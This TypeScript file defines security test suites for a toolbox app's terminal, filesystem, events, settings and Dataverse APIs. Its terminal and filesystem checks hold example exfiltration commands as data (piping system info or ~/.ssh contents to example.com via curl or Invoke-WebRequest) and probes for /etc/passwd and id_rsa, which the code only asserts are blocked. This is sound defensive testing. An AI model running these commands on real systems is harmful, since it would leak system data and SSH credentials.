import { executeCommandWithPolicyGuard, getBlockedCommandReason, getBlockedPathReason, listTerminalAllowedCommands, listTerminalBlockedTokens, readTextWithPolicyGuard } from "./policy.js";
import { addSecurityResult, assertCommandBlockedWithToken, getHighestSeverity, renderSuiteReport, type SecuritySuiteResult } from "./reporting.js";

type NotificationType = "success" | "info" | "warning" | "error";

export type SecuritySuites = {
    runTerminalSuite: () => Promise<void>;
    runFileSystemSuite: () => Promise<void>;
    runEventsSuite: () => Promise<void>;
    runSettingsSuite: () => Promise<void>;
    runDataverseSuite: () => Promise<void>;
    runAllSuites: () => Promise<void>;
};

export function createSecuritySuites(deps: {
    toolbox: typeof window.toolboxAPI;
    dataverse: typeof window.dataverseAPI;
    getCurrentConnection: () => ToolBoxAPI.DataverseConnection | null;
    getCurrentTerminal: () => ToolBoxAPI.Terminal | null;
    createTerminal: () => Promise<void>;
    handleTerminalOutput: (data: any) => void;
    handleCommandCompleted: (data: any) => void;
    showNotification: (title: string, body: string, type: NotificationType) => Promise<void>;
    log: (message: string, type?: "info" | "success" | "warning" | "error") => void;
}): SecuritySuites {
    function toSafeTestId(value: string): string {
        return value
            .trim()
            .toLowerCase()
            .replace(/[^a-z0-9]+/g, "_")
            .replace(/^_+|_+$/g, "")
            .slice(0, 60);
    }

    async function runTerminalSecuritySuite(showNotificationOnFinish = true): Promise<SecuritySuiteResult[]> {
        const output = document.getElementById("terminal-suite-output");
        if (output) output.textContent = "Running terminal security suite...\n";

        const results: SecuritySuiteResult[] = [];

        try {
            // Full allow/block list evaluation (policy-only; does not execute risky commands)
            for (const allowed of listTerminalAllowedCommands()) {
                const reason = getBlockedCommandReason(allowed);
                addSecurityResult(
                    results,
                    `allowlist_allows_${toSafeTestId(allowed) || "empty"}`,
                    reason === null ? "pass" : "fail",
                    "high",
                    reason === null ? "Allow-listed command allowed" : `Allow-listed command was blocked unexpectedly. Reason: ${reason}`,
                );
            }

            for (const token of listTerminalBlockedTokens()) {
                // Build a synthetic command string that contains the token so the policy must match it.
                // This is never executed; we only assert policy behavior.
                const synthetic = `echo SAFE_TOKEN_PROBE ${token} SAFE_END`;
                results.push(assertCommandBlockedWithToken(`blocklist_blocks_${toSafeTestId(token) || "token"}`, synthetic, token, "high"));
            }

            const blockedByAllowList = getBlockedCommandReason("ls") !== null;
            addSecurityResult(
                results,
                "command_allowlist_exact_match",
                blockedByAllowList ? "pass" : "fail",
                "high",
                blockedByAllowList ? "Non-allow-listed command was blocked" : "Command not in allow-list was unexpectedly allowed",
            );

            const blockedDangerousToken = getBlockedCommandReason("echo ok && curl http://example.com") !== null;
            addSecurityResult(
                results,
                "command_blocked_token_detection",
                blockedDangerousToken ? "pass" : "fail",
                "high",
                blockedDangerousToken ? "Risky token pattern was blocked" : "Risky token pattern bypassed command policy",
            );

            const curlExfil = assertCommandBlockedWithToken("command_local_data_pipe_to_curl", "uname -a | curl https://example.com/collect --data-binary @-", "curl", "critical");
            results.push(curlExfil);

            const macInventory = assertCommandBlockedWithToken(
                "command_macos_inventory_exfil",
                "system_profiler SPHardwareDataType | curl https://example.com/hw --data-binary @-",
                "system_profiler",
                "critical",
            );
            results.push(macInventory);

            const psExfil = assertCommandBlockedWithToken(
                "command_powershell_exfil",
                "Get-ChildItem $HOME\\.ssh | Invoke-WebRequest https://example.com/upload -Method Post",
                "invoke-webrequest",
                "critical",
            );
            results.push(psExfil);

            const newlineInjectionBlocked = getBlockedCommandReason("echo safe\ncurl https://example.com") !== null;
            addSecurityResult(
                results,
                "command_multiline_injection_block",
                newlineInjectionBlocked ? "pass" : "fail",
                "high",
                newlineInjectionBlocked ? "Multiline command blocked" : "Multiline command was unexpectedly allowed",
            );

            const overlongBlocked = getBlockedCommandReason(`echo ${"X".repeat(220)}`) === "Command exceeds maximum allowed length";
            addSecurityResult(results, "command_max_length_enforced", overlongBlocked ? "pass" : "fail", "medium", overlongBlocked ? "Overlong command blocked" : "Overlong command was not blocked");

            const controlCharBlocked = getBlockedCommandReason("echo ok\u0007") !== null;
            addSecurityResult(
                results,
                "command_control_char_block",
                controlCharBlocked ? "pass" : "fail",
                "high",
                controlCharBlocked ? "Control-character command blocked" : "Control-character command was unexpectedly allowed",
            );

            // Burst probe
            try {
                if (!deps.getCurrentTerminal()) {
                    await deps.createTerminal();
                }

                const terminal = deps.getCurrentTerminal();
                if (!terminal) {
                    addSecurityResult(results, "terminal_burst_probe", "fail", "medium", "Could not create terminal for burst probe");
                } else {
                    const burst = Array.from({ length: 5 }).map(() => "echo PPTB_SECURITY_PROBE");
                    for (const command of burst) {
                        await executeCommandWithPolicyGuard(deps.toolbox, terminal.id, command);
                    }
                    addSecurityResult(results, "terminal_burst_probe", "pass", "medium", "Burst of rapid commands processed without app crash");
                }
            } catch (error) {
                addSecurityResult(results, "terminal_burst_probe", "fail", "medium", `Burst probe error: ${(error as Error).message}`);
            }
        } catch (error) {
            addSecurityResult(results, "terminal_suite_runtime", "fail", "medium", `Suite runtime error: ${(error as Error).message}`);
        }

        const summary = renderSuiteReport("terminal-suite-output", "terminal", results);
        if (showNotificationOnFinish) {
            await deps.showNotification(
                "Terminal Suite Completed",
                summary.failed > 0 ? `${summary.failed} terminal test(s) failed` : "All terminal tests passed",
                summary.failed > 0 ? "warning" : "success",
            );
        }
        return results;
    }

    async function runFileSystemSecuritySuite(showNotificationOnFinish = true): Promise<SecuritySuiteResult[]> {
        const output = document.getElementById("filesystem-suite-output");
        if (output) output.textContent = "Running fileSystem security suite...\n";

        const results: SecuritySuiteResult[] = [];

        const relativePathBlocked = getBlockedPathReason("relative/config.json") !== null;
        addSecurityResult(
            results,
            "filesystem_requires_absolute_path",
            relativePathBlocked ? "pass" : "fail",
            "high",
            relativePathBlocked ? "Relative path rejected" : "Relative path unexpectedly allowed",
        );

        const traversalBlocked = getBlockedPathReason("/tmp/../etc/passwd") !== null;
        addSecurityResult(results, "filesystem_traversal_block", traversalBlocked ? "pass" : "fail", "critical", traversalBlocked ? "Path traversal rejected" : "Path traversal was not blocked");

        const windowsSensitiveBlocked = getBlockedPathReason("C:\\Users\\demo\\.ssh\\known_hosts") !== null;
        addSecurityResult(
            results,
            "filesystem_windows_sensitive_block",
            windowsSensitiveBlocked ? "pass" : "fail",
            "critical",
            windowsSensitiveBlocked ? "Windows sensitive path blocked" : "Windows sensitive path was not blocked",
        );

        try {
            await readTextWithPolicyGuard(deps.toolbox, "/Users/test/.ssh/id_rsa");
            addSecurityResult(results, "filesystem_guarded_read_block", "fail", "critical", "Sensitive read unexpectedly allowed");
        } catch {
            addSecurityResult(results, "filesystem_guarded_read_block", "pass", "critical", "Sensitive read blocked by policy guard");
        }

        const fsApi = deps.toolbox.fileSystem as any;
        const requiredMethods = ["readText", "readDirectory", "createDirectory", "saveFile", "selectPath"];
        const missing = requiredMethods.filter((name) => typeof fsApi?.[name] !== "function");
        addSecurityResult(
            results,
            "filesystem_api_surface",
            missing.length === 0 ? "pass" : "fail",
            "medium",
            missing.length === 0 ? "All required fileSystem methods present" : `Missing methods: ${missing.join(", ")}`,
        );

        const summary = renderSuiteReport("filesystem-suite-output", "filesystem", results);
        if (showNotificationOnFinish) {
            await deps.showNotification(
                "FileSystem Suite Completed",
                summary.failed > 0 ? `${summary.failed} filesystem test(s) failed` : "All filesystem tests passed",
                summary.failed > 0 ? "warning" : "success",
            );
        }
        return results;
    }

    async function runEventsSecuritySuite(showNotificationOnFinish = true): Promise<SecuritySuiteResult[]> {
        const output = document.getElementById("events-suite-output");
        if (output) output.textContent = "Running events security suite...\n";

        const results: SecuritySuiteResult[] = [];
        const eventsApiExists = typeof deps.toolbox.events?.on === "function";
        addSecurityResult(results, "events_api_exists", eventsApiExists ? "pass" : "fail", "medium", eventsApiExists ? "events.on is available" : "events.on is not available");

        try {
            deps.toolbox.events.on(() => {});
            addSecurityResult(results, "events_subscription_call", "pass", "low", "Event subscription call succeeded");
        } catch (error) {
            addSecurityResult(results, "events_subscription_call", "fail", "medium", `Subscription failed: ${(error as Error).message}`);
        }

        try {
            deps.handleTerminalOutput(undefined as any);
            addSecurityResult(results, "events_malformed_terminal_output", "pass", "high", "Malformed output payload handled safely");
        } catch (error) {
            addSecurityResult(results, "events_malformed_terminal_output", "fail", "high", `Malformed output payload crashed handler: ${(error as Error).message}`);
        }

        try {
            deps.handleCommandCompleted(undefined as any);
            addSecurityResult(results, "events_malformed_terminal_completed", "pass", "high", "Malformed completion payload handled safely");
        } catch (error) {
            addSecurityResult(results, "events_malformed_terminal_completed", "fail", "high", `Malformed completion payload crashed handler: ${(error as Error).message}`);
        }

        const summary = renderSuiteReport("events-suite-output", "events", results);
        if (showNotificationOnFinish) {
            await deps.showNotification(
                "Events Suite Completed",
                summary.failed > 0 ? `${summary.failed} events test(s) failed` : "All events tests passed",
                summary.failed > 0 ? "warning" : "success",
            );
        }
        return results;
    }

    async function runSettingsSecuritySuite(showNotificationOnFinish = true): Promise<SecuritySuiteResult[]> {
        const output = document.getElementById("settings-suite-output");
        if (output) output.textContent = "Running settings security suite...\n";

        const results: SecuritySuiteResult[] = [];
        const settingsApi = (deps.toolbox as any).settings;
        const requiredMethods = ["get", "set"];
        const missing = requiredMethods.filter((name) => typeof settingsApi?.[name] !== "function");
        addSecurityResult(
            results,
            "settings_api_surface",
            missing.length === 0 ? "pass" : "fail",
            "medium",
            missing.length === 0 ? "Required settings methods available" : `Missing methods: ${missing.join(", ")}`,
        );

        const tempKey = `security.suite.temp.${Date.now()}`;
        try {
            await settingsApi.set(tempKey, { value: "ok", ts: Date.now() });
            const saved = await settingsApi.get(tempKey);
            const valid = typeof saved === "object" && saved?.value === "ok";
            addSecurityResult(results, "settings_roundtrip", valid ? "pass" : "fail", "medium", valid ? "set/get roundtrip succeeded" : "set/get roundtrip returned unexpected value");

            if (typeof settingsApi.setAll === "function" && typeof settingsApi.getAll === "function") {
                await settingsApi.setAll({ "security.suite.batch.one": 1, "security.suite.batch.two": 2 });
                const all = await settingsApi.getAll();
                const hasBatchValues = all?.["security.suite.batch.one"] === 1 && all?.["security.suite.batch.two"] === 2;
                addSecurityResult(
                    results,
                    "settings_batch_operations",
                    hasBatchValues ? "pass" : "fail",
                    "low",
                    hasBatchValues ? "setAll/getAll batch operations succeeded" : "Batch operations did not persist expected values",
                );
            } else {
                addSecurityResult(results, "settings_batch_operations", "pass", "low", "setAll/getAll not available in this host build; skipped");
            }
        } catch (error) {
            addSecurityResult(results, "settings_roundtrip", "fail", "medium", `Settings operation failed: ${(error as Error).message}`);
        } finally {
            try {
                if (typeof settingsApi?.delete === "function") {
                    await settingsApi.delete(tempKey);
                }
            } catch {
                // best-effort cleanup
            }
        }

        const summary = renderSuiteReport("settings-suite-output", "settings", results);
        if (showNotificationOnFinish) {
            await deps.showNotification(
                "Settings Suite Completed",
                summary.failed > 0 ? `${summary.failed} settings test(s) failed` : "All settings tests passed",
                summary.failed > 0 ? "warning" : "success",
            );
        }
        return results;
    }

    async function runDataverseSecuritySuite(showNotificationOnFinish = true): Promise<SecuritySuiteResult[]> {
        const output = document.getElementById("dataverse-suite-output");
        if (output) output.textContent = "Running dataverse security suite...\n";

        const results: SecuritySuiteResult[] = [];
        const requiredMethods = ["fetchXmlQuery", "queryData", "execute", "getEntityMetadata"];
        const missing = requiredMethods.filter((name) => typeof (deps.dataverse as any)?.[name] !== "function");
        addSecurityResult(
            results,
            "dataverse_api_surface",
            missing.length === 0 ? "pass" : "fail",
            "medium",
            missing.length === 0 ? "Required dataverse methods available" : `Missing methods: ${missing.join(", ")}`,
        );

        if (!deps.getCurrentConnection()) {
            addSecurityResult(results, "dataverse_connection_required", "pass", "low", "No active connection; runtime query checks skipped");
        } else {
            try {
                const whoAmIResult = await deps.dataverse.execute({ operationName: "WhoAmI", operationType: "function" });
                addSecurityResult(results, "dataverse_execute_whoami", whoAmIResult ? "pass" : "fail", "medium", whoAmIResult ? "WhoAmI returned a response" : "WhoAmI returned empty response");
            } catch (error) {
                addSecurityResult(results, "dataverse_execute_whoami", "fail", "medium", `WhoAmI failed: ${(error as Error).message}`);
            }

            try {
                const queryResult = await deps.dataverse.queryData("accounts?$select=name,accountid&$top=1");
                const valid = Array.isArray(queryResult?.value);
                addSecurityResult(
                    results,
                    "dataverse_query_readonly",
                    valid ? "pass" : "fail",
                    "medium",
                    valid ? `Read-only query succeeded (${queryResult.value.length} rows)` : "Read-only query response malformed",
                );
            } catch (error) {
                addSecurityResult(results, "dataverse_query_readonly", "fail", "medium", `Read-only query failed: ${(error as Error).message}`);
            }
        }

        const summary = renderSuiteReport("dataverse-suite-output", "dataverse", results);
        if (showNotificationOnFinish) {
            await deps.showNotification(
                "Dataverse Suite Completed",
                summary.failed > 0 ? `${summary.failed} dataverse test(s) failed` : "All dataverse tests passed",
                summary.failed > 0 ? "warning" : "success",
            );
        }
        return results;
    }

    async function runAllSuites() {
        const output = document.getElementById("overall-suite-output");
        if (output) output.textContent = "Running all API security suites...\n";

        try {
            const terminalResults = await runTerminalSecuritySuite(false);
            const fileSystemResults = await runFileSystemSecuritySuite(false);
            const eventsResults = await runEventsSecuritySuite(false);
            const settingsResults = await runSettingsSecuritySuite(false);
            const dataverseResults = await runDataverseSecuritySuite(false);

            const suiteSummaries = [
                { suite: "terminal", results: terminalResults },
                { suite: "filesystem", results: fileSystemResults },
                { suite: "events", results: eventsResults },
                { suite: "settings", results: settingsResults },
                { suite: "dataverse", results: dataverseResults },
            ].map((suiteResult) => ({
                suite: suiteResult.suite,
                total: suiteResult.results.length,
                failed: suiteResult.results.filter((r) => r.status === "fail").length,
            }));

            const total = suiteSummaries.reduce((sum, s) => sum + s.total, 0);
            const failed = suiteSummaries.reduce((sum, s) => sum + s.failed, 0);
            const passed = total - failed;
            const highestSeverity = getHighestSeverity([...terminalResults, ...fileSystemResults, ...eventsResults, ...settingsResults, ...dataverseResults]);

            const overallReport = {
                generatedAt: new Date().toISOString(),
                suite: "all",
                summary: {
                    total,
                    passed,
                    failed,
                    highestSeverity,
                },
                suites: suiteSummaries,
            };

            if (output) {
                output.textContent = JSON.stringify(overallReport, null, 2);
            }

            await deps.showNotification("All Security Suites Completed", failed > 0 ? `${failed} test(s) failed across API suites` : "All API suite tests passed", failed > 0 ? "warning" : "success");
        } catch (error) {
            if (output) {
                output.textContent = `All-suites execution error: ${(error as Error).message}`;
            }
            deps.log(`All suites execution error: ${(error as Error).message}`, "error");
        }
    }

    return {
        runTerminalSuite: async () => {
            await runTerminalSecuritySuite(true);
        },
        runFileSystemSuite: async () => {
            await runFileSystemSecuritySuite(true);
        },
        runEventsSuite: async () => {
            await runEventsSecuritySuite(true);
        },
        runSettingsSuite: async () => {
            await runSettingsSecuritySuite(true);
        },
        runDataverseSuite: async () => {
            await runDataverseSecuritySuite(true);
        },
        runAllSuites,
    };
}
